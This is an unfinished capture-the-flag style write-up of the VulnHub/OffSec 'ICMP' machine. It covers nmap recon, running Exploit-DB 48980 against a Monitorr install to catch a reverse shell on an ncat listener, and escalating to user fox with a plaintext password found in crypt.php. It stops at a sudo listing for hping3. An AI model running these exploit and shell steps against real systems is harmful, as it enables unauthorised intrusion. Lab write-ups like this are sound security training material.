---
description: VulnHub & OffSec ICMP machine writeup
cover: ../.gitbook/assets/image (20) (1).png
coverY: 0
---

# \[Intermediate] ICMP

### Recon

#### Services                                                                                                                                                               21ms  ✓&#x20;

```bash
─$ nmap -sC -sV -v -T5 icmp                                     
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 deb52389bb9fd41ab50453d0b75cb03f (RSA)
|   256 160914eab9fa17e945395e3bb4fd110a (ECDSA)
|_  256 9f665e71b9125ded705a4f5a8d0d65d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title:             Monitorr            | Monitorr        
|_Requested resource was http://icmp/mon/
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Subdirs

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

#### Monitorr

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

\+ link on repo:

{% embed url="https://github.com/Monitorr/Monitorr" %}

### www-data

Exploit:&#x20;

{% embed url="https://www.exploit-db.com/exploits/48980" %}

{% code overflow="wrap" %}
```bash
$  python3 48980.py http://192.168.110.218/mon/ 192.168.49.110 4444
```
{% endcode %}

<pre class="language-bash"><code class="lang-bash">$ ncat -nvlp 4444 
<strong>www-data@icmp:/var/www/html/mon/assets/data/usrimg$ pwd
</strong>/var/www/html/mon/assets/data/usrimg
</code></pre>

### Privelege Escalation

#### www-data to fox

<mark style="color:red;">`pspy`</mark> <mark style="color:red;"></mark><mark style="color:red;"></mark> enum didn't gave me anything, so I checked machine for another users:

```bash
www-data@icmp:/var/www/html/mon/assets/data/usrimg$ ls /home    
ls /home
fox
www-data@icmp:/var/www/html/mon/assets/data/usrimg$ ls -lsa /home/fox
ls -lsa /home/fox
total 20
4 drwxr-xr-x 3 root root 4096 Dec  3  2020 .
4 drwxr-xr-x 3 root root 4096 Dec  3  2020 ..
0 lrwxrwxrwx 1 root root    9 Dec  3  2020 .bash_history -> /dev/null
4 drwx--x--x 2 fox  fox  4096 Dec  3  2020 devel
4 -rw-r--r-- 1 fox  fox    33 Feb 27 19:04 local.txt
4 -rw-r--r-- 1 root root   78 Dec  3  2020 reminder

```



Checking <mark style="color:orange;">`reminder`</mark> we get a hint:

```bash
www-data@icmp:/home/fox$ cat reminder

crypt with crypt.php: done, it works
work on decrypt with crypt.php: howto?!?
```

<pre class="language-php"><code class="lang-php">www-data@icmp:/home/fox$ cat devel/crypt.php
<strong>&#x3C;?php
</strong><strong>echo crypt('BUHNIJMONIBUVCYTTYVGBUHJNI','da'); 
</strong><strong>?>
</strong></code></pre>

```bash
www-data@icmp:/home/fox$ ls
ls
devel
local.txt
reminder
www-data@icmp:/home/fox$ su fox
su fox
Password: BUHNIJMONIBUVCYTTYVGBUHJNI

$ python -c 'import pty; pty.spawn("/bin/bash")'

fox@icmp:~$ whoami
whoami
fox
```

#### fox to root

<mark style="color:red;">`sudo -l:`</mark>

```bash
fox@icmp:~$ sudo -l 
sudo -l 
Matching Defaults entries for fox on icmp:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fox may run the following commands on icmp:
    (root) /usr/sbin/hping3 --icmp *
    (root) /usr/bin/killall hping3

```

\~ soon \~
